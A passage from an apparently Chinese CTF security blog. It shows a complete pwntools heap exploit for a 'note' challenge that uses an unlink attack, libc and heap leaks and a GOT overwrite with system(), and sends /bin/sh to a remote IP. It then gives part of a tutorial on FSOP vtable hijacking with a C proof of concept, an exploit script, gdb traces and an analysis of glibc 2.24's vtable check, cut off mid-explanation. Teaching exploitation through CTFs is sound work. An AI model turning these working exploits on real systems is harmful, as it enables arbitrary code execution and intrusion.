<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size, title, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the title:\n'</span>)</div><div class="line">    p.send(title)</div><div class="line">    p.recvuntil(<span class="string">'Input the size of content:\n'</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the content:\n'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p, idx, offset, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the start offset:'</span>)</div><div class="line">    p.send(str(offset) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the new content:'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeTitle</span><span class="params">(p, idx, title)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">    p.send(<span class="string">'5\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the new title:'</span>)</div><div class="line">    p.send(title)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./note')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">4003</span>)</div><div class="line"></div><div class="line">ptr = <span class="number">0x6020c0</span> + <span class="number">0x08</span> * <span class="number">8</span></div><div class="line">fake_fd = ptr - <span class="number">0x18</span></div><div class="line">fake_bk = fake_fd + <span class="number">0x08</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x121</span>)</div><div class="line">payload += p64(fake_fd)</div><div class="line">payload += p64(fake_bk)[:<span class="number">3</span>]</div><div class="line"></div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, payload + <span class="string">'\n'</span>, <span class="string">'B'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'C'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'D'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'E'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'F'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span></div><div class="line">payload += p64(<span class="number">0x120</span>)</div><div class="line">payload += p64(<span class="number">0xa0</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">8</span>, <span class="number">127</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">9</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x6020c0</span>)</div><div class="line">payload += p64(<span class="number">0x601fd8</span>)</div><div class="line">payload += p64(<span class="number">0x602048</span>)</div><div class="line">payload += p64(<span class="number">0x602008</span>)[:<span class="number">3</span>]</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">8</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">7</span>, p64(<span class="number">0x4007e6</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">5</span>, <span class="number">1</span>, <span class="string">'A'</span> * <span class="number">0x1f</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x1f</span>)</div><div class="line">data = p.recvuntil(<span class="string">'Delete success'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">heap_addr = u64(data)</div><div class="line">log.info(<span class="string">'heap addr(): '</span> + hex(heap_addr))</div><div class="line"></div><div class="line">leak_addr = heap_addr + <span class="number">0x770</span></div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x70</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x2b0</span>) + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x00</span> )+ <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x50</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(leak_addr + <span class="number">0x990</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x40</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x000000000040117b</span>)+ p64(<span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x20</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00000000e8150c70</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x20</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line">p.recvuntil(<span class="string">'\x0a'</span>)</div><div class="line">data = p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">main_arena = u64(data)</div><div class="line"></div><div class="line">log.info(<span class="string">"main_arena : "</span> + hex(main_arena))</div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"></div><div class="line"><span class="comment">#libc_base = main_arena - 0x398b58</span></div><div class="line">libc_base = main_arena - <span class="number">0x3BE7B8</span></div><div class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">log.info(<span class="string">"system() addr: "</span> + hex(system_addr))</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(<span class="number">0x602058</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">0</span>, p64(system_addr) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-FSOP以及glibc针对其所做的防御措施" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/02/04/FSOP以及glibc针对其所做的防御措施/" class="article-date">
  	<time datetime="2017-02-04T13:40:48.000Z" itemprop="datePublished">2017-02-04</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/04/FSOP以及glibc针对其所做的防御措施/">
        FSOP以及glibc针对其所做的防御措施
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>年三十晚上边看电视边搞了下<a href="http://pwnable.tw" target="_blank" rel="external">pwnable.tw</a>上一个FSOP的题目(春晚太无聊了，唯一一个有意思的开心麻花的小品我还错过了)，<br>当时本地写好已经可以getshell的exp，跑远程失败了，返回本地再调试的时候居然失败了<br>当时我的心理活动大概是这样的  </p>
<pre><code>“诶，咋刚才可以现在不行了”
“这个fatal error是啥，刚才咋没有”
“我明明啥都没改啊”
“还是调一下吧”
“诶WOC这咋有个check”
“诶WOC为啥刚才能过？”
</code></pre><p>最后才发现重新返回本地跑exp的时候没有把libc切成题目给的libc(exp里一个<code>./</code>被我误删了)，而是用的我本机的libc，而我本机的libc版本针对fsop做了个专门的check，<br>所以是跑不起来的</p>
<h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><h2 id="What-is-FSOP"><a href="#What-is-FSOP" class="headerlink" title="What is FSOP"></a>What is FSOP</h2><p>ROP是一种针对栈溢出的内存攻击技术，其全称是Return-oriented programming，即返回导向编程,这种攻击技术是针对函数的返回地址，篡改返回地址达到控制程序流的目的<br>FSOP这个名字出自<a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="external">HITCON CTF Qual 2016 - House of Orange Write up</a>,<br>顾名思义，就是控制文件流，进而控制程序流程</p>
<h2 id="FILE-结构体"><a href="#FILE-结构体" class="headerlink" title="FILE 结构体"></a>FILE 结构体</h2><p>一般我们对于文件是这么操作的  </p>
<pre><code>FILE *fp = fopen(&quot;/file/path&quot;, &quot;w+&quot;);
fwrite(&quot;test&quot;, 1, 4, fp);
fclose(fp);
</code></pre><p><code>fopen()</code>函数接收参数，然后会在堆上申请一块内存来存放<code>FILE</code>结构体，返回一个<code>FILE</code>类型的结构体指针，供<code>fwrite</code>，<code>fclose</code>等函数使用，<br>现代linux系统下，<code>FILE</code>结构体在glibc源码中的定义为<a href="https://fossies.org/dox/glibc-2.24/struct__IO__FILE__plus.html" target="_blank" rel="external"><code>struct _IO_FILE_plus</code></a>,实际上是一个<code>_IO_FILE</code>结构体加上一个虚函数表，<br>这个虚函数表里有close,write,read等等函数，整个结构体大概长这样：<br><img src="https://outflux.net/exploits/glibc-FILE-vtable.png" alt=""><br>所以我们在执行<code>fclose(fp)</code>时，实际上执行的是<code>fp-&gt;close()</code><br>对于FSOP的利用，我们只需要知道虚函数表的位置就行了  </p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> deadbeef[<span class="number">0x400</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Hello world!"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    read(<span class="number">0</span>, deadbeef, <span class="number">0x400</span>);</div><div class="line">    fclose((FILE *)deadbeef);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译下  </p>
<pre><code>gcc -m32 ./fsop.c -o ./fsop -no-pie
</code></pre><p>(GCC6默认开启PIE了)<br>IDA打开看下几个要用到的地址<br>pwn函数  </p>
<pre><code>.text:080484BB
.text:080484BB ; =============== S U B R O U T I N E =======================================
.text:080484BB
.text:080484BB ; Attributes: noreturn bp-based frame
.text:080484BB
.text:080484BB                 public pwn
.text:080484BB pwn             proc near
.text:080484BB                 push    ebp
.text:080484BC                 mov     ebp, esp
.text:080484BE                 push    ebx
.text:080484BF                 sub     esp, 4
.text:080484C2                 call    __x86_get_pc_thunk_bx
.text:080484C7                 add     ebx, 1B39h
.text:080484CD                 sub     esp, 0Ch
.text:080484D0                 lea     eax, (aHelloWorld - 804A000h)[ebx] ; &quot;Hello world!&quot;
.text:080484D6                 push    eax             ; s
.text:080484D7                 call    _puts
.text:080484DC                 add     esp, 10h
.text:080484DF                 sub     esp, 0Ch
.text:080484E2                 push    0               ; status
.text:080484E4                 call    _exit
.text:080484E4 pwn             endp
</code></pre><p>deadbeef的地址  </p>
<pre><code>.bss:0804A060                 public deadbeef
.bss:0804A060 ; FILE deadbeef
.bss:0804A060 deadbeef        FILE &lt;?&gt;                ; DATA XREF: main+22o
.bss:0804A060                                         ; main+36o
.bss:0804A0F4                 db    ? ;
</code></pre><p>写个py脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./fsop'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc_32.so.6"</span>&#125;)</div><div class="line"></div><div class="line">fake_file_addr = <span class="number">0x0804A060</span></div><div class="line">pwn_addr = <span class="number">0x080484BB</span></div><div class="line"></div><div class="line">fake_vtable = p32(pwn_addr) * <span class="number">21</span></div><div class="line">fake_vtable_addr = fake_file_addr + <span class="number">0x50</span></div><div class="line"></div><div class="line">fake_file = <span class="string">'\xff'</span> * <span class="number">0x4c</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += fake_file</div><div class="line">payload += p32(fake_vtable_addr)</div><div class="line">payload += fake_vtable</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>这个py脚本里我把伪造的虚函数表全部填成了pwn函数的地址，把<code>FILE</code>结构体的其他成员全部写成了0xff,这样就可以绕过glibc的一些检查<br>打下exp   </p>
<pre><code>root@kali:/vagrant/fsop# python fsop_exp.py
[x] Starting local process &apos;./fsop&apos;
[+] Starting local process &apos;./fsop&apos;: Done
[*] Switching to interactive mode
Hello world!
[*] Got EOF while reading in interactive

[*] Process &apos;./fsop&apos; stopped with exit code 0
[*] Got EOF while sending in interactive
root@kali:/vagrant/fsop#
</code></pre><p>成功执行pwn函数  </p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>关于<code>_IO_FILE</code>结构体的第一个成员，我在实验的时候发现，通过<code>fopen</code>函数返回的fp,其第一个成员都是一个固定值，实际上该成员并没有规定一个具体数值，<br>就如同上一个exp，将其设置为0xffffffff也没有影响，所以如果目标是得到shell的话，完全可以将其值设为0x3b6873(字符串<code>&#39;sh;\x00&#39;</code>),然后控制虚函数表成员为system()，<br>就可以getshell了  </p>
<h1 id="glibc针对FSOP所做的patch"><a href="#glibc针对FSOP所做的patch" class="headerlink" title="glibc针对FSOP所做的patch"></a>glibc针对FSOP所做的patch</h1><h2 id="glibc-2-24中的check"><a href="#glibc-2-24中的check" class="headerlink" title="glibc 2.24中的check"></a>glibc 2.24中的check</h2><p>在上一个exp里，我将环境变量的<code>LD_PRLOAD</code>设置为了<code>./libc_32.so.6</code>，这个libc是我从<a href="http://pwnable.tw" target="_blank" rel="external">pwnable.tw</a>扒拉下来的，运行一下发现版本是2.23，并没有针对FSOP做一个有效的防御，<br>现在把那个环境变量去掉，再运行一下exp  </p>
<pre><code>root@kali:/vagrant/fsop# python fsop_exp.py
[x] Starting local process &apos;./fsop&apos;
[+] Starting local process &apos;./fsop&apos;: Done
[*] Switching to interactive mode
Fatal error: glibc detected an invalid stdio handle
[*] Got EOF while reading in interactive

[*] Process &apos;./fsop&apos; stopped with exit code -6
[*] Got EOF while sending in interactive
</code></pre><p>我本机的libc版本是2.24,从这个错误信息来看，因该是glibc针对劫持<code>FILE</code>结构体虚函数表的攻击方式做了个有效的防御，我们用gdb来调试看看，<br>在原先脚本发送payload之前设置一个挂起，然后用gdb attach附加到进程，在fclose下个断点  </p>
<pre><code>gdb-peda$ b fclose
Breakpoint 1 at 0xf76544f6 (2 locations)
</code></pre><p>单步跟踪至fclose  </p>
<pre><code>[-------------------------------------code-------------------------------------]
   0xf76546f0 &lt;fclose+512&gt;:     sub    esp,0xc
   0xf76546f3 &lt;fclose+515&gt;:     mov    ebx,edi
   0xf76546f5 &lt;fclose+517&gt;:     push   esi
=&gt; 0xf76546f6 &lt;fclose+518&gt;:     call   0xf7717d40 &lt;fclose&gt;
   0xf76546fb &lt;fclose+523&gt;:     add    esp,0x10
   0xf76546fe &lt;fclose+526&gt;:     mov    DWORD PTR [ebp-0x1c],eax
   0xf7654701 &lt;fclose+529&gt;:     mov    eax,DWORD PTR [ebp-0x1c]
   0xf7654704 &lt;fclose+532&gt;:     lea    esp,[ebp-0xc]
Guessed arguments:
arg[0]: 0x804a060 --&gt; 0xffffffff
</code></pre><p>步入，然后再单步跟踪至<code>fclose+176</code>  </p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0xffffffff
EBX: 0xf77aa000 --&gt; 0x1b2db0
ECX: 0x8000
EDX: 0x8000
ESI: 0x804a060 --&gt; 0xffffff7f
EDI: 0xf77aa000 --&gt; 0x1b2db0
EBP: 0xffacc918 --&gt; 0xffacc958 --&gt; 0xffacc978 --&gt; 0x0
ESP: 0xffacc8f0 --&gt; 0x1
EIP: 0xf7717df0 (&lt;fclose+176&gt;:  mov    ebx,DWORD PTR [esi+0x4c])
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7717de5 &lt;fclose+165&gt;:     je     0xf7717e6b &lt;fclose+299&gt;
   0xf7717deb &lt;fclose+171&gt;:     nop
   0xf7717dec &lt;fclose+172&gt;:     lea    esi,[esi+eiz*1+0x0]
=&gt; 0xf7717df0 &lt;fclose+176&gt;:     mov    ebx,DWORD PTR [esi+0x4c]
   0xf7717df3 &lt;fclose+179&gt;:     lea    eax,[edi-0x1d00]
   0xf7717df9 &lt;fclose+185&gt;:     lea    edx,[edi-0x152c]
   0xf7717dff &lt;fclose+191&gt;:     sub    edx,eax
   0xf7717e01 &lt;fclose+193&gt;:     mov    ecx,ebx
</code></pre><p>此时<code>esi</code>存放的是<code>FILE</code>结构体的地址，而<code>[esi+0x4c]</code>就是存放虚函数表地址的地方，这一步将<code>ebx</code>设置为了结构体中虚表地址<br>运行至<code>fclose+191</code>  </p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0xf77a8300 --&gt; 0x0                                                          
EBX: 0x804a0b0 --&gt; 0x80484bb (&lt;pwn&gt;:    push   ebp)                              
ECX: 0x8000                                                                      
EDX: 0xf77a8ad4 --&gt; 0x0                                                          
ESI: 0x804a060 --&gt; 0xffffff7f                                                    
EDI: 0xf77aa000 --&gt; 0x1b2db0                                                     
EBP: 0xffacc918 --&gt; 0xffacc958 --&gt; 0xffacc978 --&gt; 0x0                            
ESP: 0xffacc8f0 --&gt; 0x1                                                          
EIP: 0xf7717dff (&lt;fclose+191&gt;:  sub    edx,eax)                                  
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)  
[-------------------------------------code-------------------------------------] 
   0xf7717df0 &lt;fclose+176&gt;:     mov    ebx,DWORD PTR [esi+0x4c]                  
   0xf7717df3 &lt;fclose+179&gt;:     lea    eax,[edi-0x1d00]                          
   0xf7717df9 &lt;fclose+185&gt;:     lea    edx,[edi-0x152c]                          
=&gt; 0xf7717dff &lt;fclose+191&gt;:     sub    edx,eax                                   
   0xf7717e01 &lt;fclose+193&gt;:     mov    ecx,ebx                                   
   0xf7717e03 &lt;fclose+195&gt;:     sub    ecx,eax                                   
   0xf7717e05 &lt;fclose+197&gt;:     cmp    edx,ecx                                   
   0xf7717e07 &lt;fclose+199&gt;:     jbe    0xf7717ee0 &lt;fclose+416&gt;                    
</code></pre><p>这两步完成后，<code>eax</code>和<code>edx</code>分别被赋予了两个和<code>edi</code>寄存器相关的值，而x86下程序运行时，<code>edi</code>一般都指向<code>libc</code>的数据段,<br>用<code>gdb-peda</code>的<code>vmmap</code>查看内存映射，计算出这两个值和libc的偏移分别是<code>0x1b1300</code>和<code>0x1b1ad4</code>,用IDA打开本机的libc，看看这两个地址都是个啥  </p>
<pre><code>__libc_IO_vtables:001B1300 ; ===========================================================================
__libc_IO_vtables:001B1300
__libc_IO_vtables:001B1300 ; Segment type: Pure data
__libc_IO_vtables:001B1300 ; Segment permissions: Read/Write
__libc_IO_vtables:001B1300 ; Segment alignment &apos;32byte&apos; can not be represented in assembly
__libc_IO_vtables:001B1300 __libc_IO_vtables segment para public &apos;DATA&apos; use32
__libc_IO_vtables:001B1300                 assume cs:__libc_IO_vtables
__libc_IO_vtables:001B1300                 ;org 1B1300h
__libc_IO_vtables:001B1300 unk_1B1300      db    0                 ; DATA XREF: sub_3F940+3Bo
__libc_IO_vtables:001B1300                                         ; vfprintf+172o ...
__libc_IO_vtables:001B1301                 db    0
__libc_IO_vtables:001B1302                 db    0
__libc_IO_vtables:001B1303                 db    0
__libc_IO_vtables:001B1304                 db    0
__libc_IO_vtables:001B1305                 db    0
__libc_IO_vtables:001B1306                 db    0
__libc_IO_vtables:001B1307                 db    0
__libc_IO_vtables:001B1308                 dd offset _IO_default_finish
__libc_IO_vtables:001B130C                 dd offset sub_3F940
__libc_IO_vtables:001B1310                 dd offset sub_6BA30
__libc_IO_vtables:001B1314                 dd offset _IO_default_uflow
__libc_IO_vtables:001B1318                 dd offset _IO_default_pbackfail
__libc_IO_vtables:001B131C                 dd offset _IO_default_xsputn
__libc_IO_vtables:001B1320                 dd offset _IO_default_xsgetn
__libc_IO_vtables:001B1324                 dd offset sub_6C130
__libc_IO_vtables:001B1328                 dd offset sub_6BDD0
__libc_IO_vtables:001B132C                 dd offset sub_6BCA0
__libc_IO_vtables:001B1330                 dd offset sub_6C080
__libc_IO_vtables:001B1334                 dd offset _IO_default_doallocate
__libc_IO_vtables:001B1338                 dd offset sub_6CCC0
__libc_IO_vtables:001B133C                 dd offset sub_6CCD0
__libc_IO_vtables:001B1340                 dd offset sub_6CCA0
__libc_IO_vtables:001B1344                 dd offset sub_6C080
__libc_IO_vtables:001B1348                 dd offset sub_6CCB0


__libc_IO_vtables:001B1ABC                 dd offset sub_6CCD0
__libc_IO_vtables:001B1AC0                 dd offset sub_6CCA0
__libc_IO_vtables:001B1AC4                 dd offset sub_6C080
__libc_IO_vtables:001B1AC8                 dd offset sub_6CCB0
__libc_IO_vtables:001B1ACC                 dd offset sub_6CCE0
__libc_IO_vtables:001B1AD0                 dd offset nullsub_7
__libc_IO_vtables:001B1AD0 __libc_IO_vtables ends
__libc_IO_vtables:001B1AD0
</code></pre><p>可以看出，这两个值分别指向了libc中“默认”的IO虚函数表的起始位置，再结合后面的汇编代码  </p>
